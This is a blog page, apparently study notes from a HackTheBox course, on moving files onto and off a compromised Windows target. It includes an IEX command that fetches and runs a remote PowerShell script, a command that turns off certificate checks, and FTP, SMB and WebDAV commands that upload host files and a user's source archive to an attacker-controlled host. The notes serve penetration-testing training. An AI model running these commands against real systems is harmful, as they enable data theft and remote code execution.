@@ -1,0 +1,453 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || FILE TRANSFERS</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/like/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/like/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a target="_blank" rel="noopener" href="https://en.korilin.com">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/like/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/like/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a target="_blank" rel="noopener" href="https://en.korilin.com">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>FILE TRANSFERS </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/11
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#ff7d73>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="FILE-TRANSFERS"><a href="#FILE-TRANSFERS" class="headerlink" title="FILE TRANSFERS"></a>FILE TRANSFERS</h1><p>##WINDOWS</p>
+<p>PowerShell Base64编码和解码<br>根据我们想要传输的文件大小，我们可以使用不需要网络通信的不同方法。如果我们可以访问终端，我们可以将文件编码为base64字符串，从终端复制其内容并执行反向操作，解码原始内容中的文件。让我们看看如何使用PowerShell实现这一点。<br>使用此方法的一个重要步骤是确保编码和解码的文件是正确的。我们可以使用md5sum，一个计算和验证128位MD5校验和的程序。MD5散列的作用是文件的紧凑数字指纹，这意味着一个文件在任何地方都应该有相同的MD5散列。让我们尝试传输一个示例ssh密钥。它可以是其他任何东西，从我们的Pwnbox到Windows目标。</p>
+<pre><code>Tanin@htb[/htb]$ md5sum id_rsa
+
+4e301756a07ded0a2dd6953abf015278  id_rsa
+</code></pre>
+<pre><code>cat id_rsa |base64 -w 0;echo
+</code></pre>
+<p><code>base64 -w 0</code>：这个部分使用<code>base64</code>命令将前一个命令的输出进行Base64编码。<code>-w 0</code>选项表示输出结果不进行换行，而是将整个编码结果放在一行中。</p>
+<p>我们可以复制此内容并将其粘贴到Windows PowerShell终端中，然后使用一些PowerShell函数对其进行解码。</p>
+<pre><code>PS C:\htb&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;$&#123;md5_string&#125;&quot;))
+</code></pre>
+<p>###PowerShell Web下载</p>
+<p>大多数公司都允许HTTP和HTTPS出站流量通过防火墙，以提高员工的工作效率。利用这些传输方法进行文件传输操作非常方便。尽管如此，维权者可以使用网络过滤解决方案来阻止访问特定的网站类别，阻止下载文件类型（如.exe），或者只允许访问更受限制的网络中的白名单域列表。<br>PowerShell提供了许多文件传输选项。在任何版本的PowerShell中，System.Net.WebClient类都可以用于通过HTTP、HTTPS或FTP下载文件。下表介绍了从资源下载数据的WebClient方法：</p>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0">OpenRead</a></th>
+<th>Returns the data from a resource as a <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0">Stream</a>.</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0">OpenReadAsync</a></td>
+<td>Returns the data from a resource without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0">DownloadData</a></td>
+<td>Downloads data from a resource and returns a Byte array.</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0">DownloadDataAsync</a></td>
+<td>Downloads data from a resource and returns a Byte array without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0">DownloadFile</a></td>
+<td>Downloads data from a resource to a local file.</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0">DownloadFileAsync</a></td>
+<td>Downloads data from a resource to a local file without blocking the calling thread.</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">DownloadString</a></td>
+<td>Downloads a String from a resource and returns a String.</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0">DownloadStringAsync</a></td>
+<td>Downloads a String from a resource without blocking the calling thread.</td>
+</tr>
+</tbody></table>
+<p>PowerShell调用Web请求<br>从PowerShell 3.0起，Invoke-WebRequest cmdlet也可用，但下载文件的速度明显较慢。您可以使用别名<strong>iwr、curl和wget</strong>，而不是InvokeWebRequest的全名。</p>
+<p>###PowerShell的常见错误</p>
+<p>在某些情况下，Internet Explorer首次启动配置可能尚未完成，从而阻止下载。这可以使用参数-UseBasicParsing绕过。</p>
+<p>如果证书不受信任，PowerShell下载中的另一个错误与SSL&#x2F;TLS安全通道有关。我们可以使用以下命令绕过该错误：</p>
+<pre><code>PS C:\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = &#123;$true&#125;
+</code></pre>
+<p>###SMB Downloads</p>
+<p>The Server Message Block protocol (SMB protocol) that runs on port TCP&#x2F;445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.</p>
+<p>We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver.py</a> from Impacket and then use <code>copy</code>, <code>move</code>, PowerShell <code>Copy-Item</code>, or any other tool that allows connection to SMB.</p>
+<pre><code>Tanin@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+</code></pre>
+<h3 id="Create-the-SMB-Server"><a href="#Create-the-SMB-Server" class="headerlink" title="Create the SMB Server"></a>Create the SMB Server</h3><p>新版本的Windows阻止未经身份验证的访客访问，正如我们在以下命令中看到的：</p>
+<pre><code>C:\htb&gt; copy \\192.168.220.133\share\nc.exe
+
+You can&#39;t access this shared folder because your organization&#39;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+</code></pre>
+<p>要在这种情况下传输文件，我们可以使用Impacket SMB服务器设置用户名和密码，并在windows目标计算机上装载SMB服务器：</p>
+<pre><code> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+</code></pre>
+<p>使用用户名和密码装载SMB服务器</p>
+<pre><code>C:\htb&gt; net use n: \\192.168.220.133\share /user:test test
+
+The command completed successfully.
+</code></pre>
+<p>###FTP下载</p>
+<p>另一种传输文件的方法是使用FTP（文件传输协议），它使用端口TCP&#x2F;21和TCP&#x2F;20。我们可以使用FTP客户端或PowerShell Net.WebClient从FTP服务器下载文件。<br>我们可以使用Python3-pyftpdlib模块在攻击主机中配置FTP服务器。可以使用以下命令进行安装：</p>
+<pre><code>sudo pip3 install pyftpdlib
+</code></pre>
+<p>然后我们可以指定端口号21，因为在默认情况下，pyftpdlib使用端口2121。如果我们没有设置用户和密码，则默认情况下会启用匿名身份验证。</p>
+<p>设置Python3 FTP服务器</p>
+<pre><code> sudo python3 -m pyftpdlib --port 21
+</code></pre>
+<p>使用PowerShell从FTP服务器传输文件</p>
+<pre><code>PS C:\htb&gt; (New-Object Net.WebClient).DownloadFile(&#39;ftp://192.168.49.128/file.txt&#39;, &#39;ftp-file.txt&#39;)
+</code></pre>
+<p>当我们在远程机器上获得shell时，我们可能没有交互式shell。如果是这种情况，我们可以创建一个FTP命令文件来下载一个文件。首先，我们需要创建一个包含要执行的命令的文件，然后使用FTP客户端使用该文件下载该文件。</p>
+<p>为FTP客户端创建命令文件并下载目标文件</p>
+<pre><code>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
+C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
+C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
+C:\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt
+C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
+C:\htb&gt; ftp -v -n -s:ftpcommand.txt
+ftp&gt; open 192.168.49.128
+Log in with USER and PASS first.
+ftp&gt; USER anonymous
+
+ftp&gt; GET file.txt
+ftp&gt; bye
+
+C:\htb&gt;more file.txt
+This is a test file
+</code></pre>
+<h3 id="PowerShell-Web-Uploads"><a href="#PowerShell-Web-Uploads" class="headerlink" title="PowerShell Web Uploads"></a>PowerShell Web Uploads</h3><p>PowerShell没有用于上载操作的内置函数，但我们可以使用Invoke-WebRequest或Invoke-RestMethod来构建上载函数。我们还需要一个接受上传的web服务器，这不是大多数常见web服务器实用程序中的默认选项。<br>对于我们的web服务器，我们可以使用uploadserver，这是Python HTTP.server模块的扩展模块，其中包括一个文件上传页面。让我们安装它并启动Web服务器。</p>
+<pre><code>pip3 install uploadserver
+</code></pre>
+<pre><code>python3 -m uploadserver
+</code></pre>
+<p>现在，我们可以使用PowerShell脚本PSUpload.ps1，该脚本使用Invoke-WebRequest来执行上载操作。该脚本接受两个参数-File和-Uri，前者用于指定文件路径，后者用于上传文件的服务器URL。让我们尝试从Windows主机上传主机文件。</p>
+<p>将文件上载到Python上载服务器的PowerShell脚本</p>
+<pre><code>PS C:\htb&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;)
+PS C:\htb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+</code></pre>
+<p>###SMB上载</p>
+<p>我们之前讨论过，公司通常允许使用HTTP（TCP&#x2F;80）和HTTPS（TCP&#x2F;443）协议进行出站流量。通常，企业不允许SMB协议（TCP&#x2F;445）离开其内部网络，因为这会使他们面临潜在的攻击。有关此方面的更多信息，我们可以阅读Microsoft的文章“防止SMB流量从横向连接进入或离开网络”。<br>另一种选择是使用WebDav通过HTTP运行SMB。WebDAV（RFC 4918）是HTTP的扩展，HTTP是网络浏览器和网络服务器用来相互通信的互联网协议。WebDAV协议使Web服务器能够像文件服务器一样运行，支持协作内容创作。WebDAV也可以使用HTTPS。<br>当您使用SMB时，它将首先尝试使用SMB协议进行连接，如果没有可用的SMB共享，它将尝试使用HTTP进行连接。在下面的Wireshark捕获中，我们尝试连接到文件共享测试3，因为它没有发现任何SMB，所以它使用HTTP。</p>
+<p>配置WebDav服务器<br>要设置我们的WebDav服务器，我们需要安装两个Python模块，wsgidav和cheroot（您可以在这里阅读更多关于此实现的信息：wsgidav-github）。安装它们之后，我们在目标目录中运行wsgidav应用程序。<br>安装WebDav Python模块</p>
+<pre><code> sudo pip install wsgidav cheroot
+</code></pre>
+<pre><code>sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+</code></pre>
+<p>现在我们可以尝试使用DavWWWRoot目录连接到共享。</p>
+<pre><code>C:\htb&gt; dir \\192.168.49.128\DavWWWRoot
+</code></pre>
+<p>注意：DavWWWRoot是一个由Windows Shell识别的特殊关键字。您的WebDAV服务器上不存在这样的文件夹。DavWWWRoot关键字告诉Mini-Redirector驱动程序，该驱动程序处理您正在连接到WebDAV服务器根目录的WebDAV请求。<br>如果在连接到服务器时指定了服务器上存在的文件夹，则可以避免使用此关键字。例如：\192.168.49.128\sharefolder</p>
+<p>使用SMB上载文件</p>
+<pre><code>C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+</code></pre>
+<p>注意：如果没有SMB（TCP&#x2F;445）限制，您可以使用impacket-smbserver，方法与我们为下载操作设置的方法相同。</p>
+<p>###FTP Uploads</p>
+<p>使用FTP上传文件与下载文件非常相似。我们可以使用PowerShell或FTP客户端来完成操作。在使用Python模块pyftpdlib启动FTP服务器之前，我们需要指定选项–write，以允许客户端将文件上传到我们的攻击主机。</p>
+<pre><code>sudo python3 -m pyftpdlib --port 21 --write
+</code></pre>
+<p>现在，让我们使用PowerShell上载功能将文件上载到FTP服务器。</p>
+<p>现在，让我们使用PowerShell上载功能将文件上载到FTP服务器。</p>
+<p>PowerShell上载文件</p>
+<pre><code>PS C:\htb&gt; (New-Object Net.WebClient).UploadFile(&#39;ftp://192.168.49.128/ftp-hosts&#39;, &#39;C:\Windows\System32\drivers\etc\hosts&#39;)
+</code></pre>
+<p>为FTP客户端创建用于上载文件的命令文件</p>
+<pre><code>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
+C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
+C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
+C:\htb&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
+C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
+C:\htb&gt; ftp -v -n -s:ftpcommand.txt
+ftp&gt; open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp&gt; USER anonymous
+ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
+ftp&gt; bye
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
